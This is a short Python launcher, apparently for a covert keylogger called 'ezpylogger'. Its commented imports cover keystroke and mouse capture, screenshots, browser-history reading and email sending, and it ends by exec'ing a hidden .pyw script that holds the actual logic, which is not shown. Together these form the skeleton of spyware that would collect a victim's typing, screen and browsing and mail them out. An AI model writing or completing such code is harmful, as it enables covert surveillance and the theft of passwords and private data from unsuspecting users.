import os, json, win32api, traceback
from time import sleep
from threading import Timer
from pynput import keyboard, mouse # Keylogger
from PIL.ImageGrab import grab as screenshot # Screenshots
import sqlite3 # Browser history
import smtplib, ssl # Email
from email.message import EmailMessage # Email

exec(open("ezpylogger.pyw").read()) # Run the actual script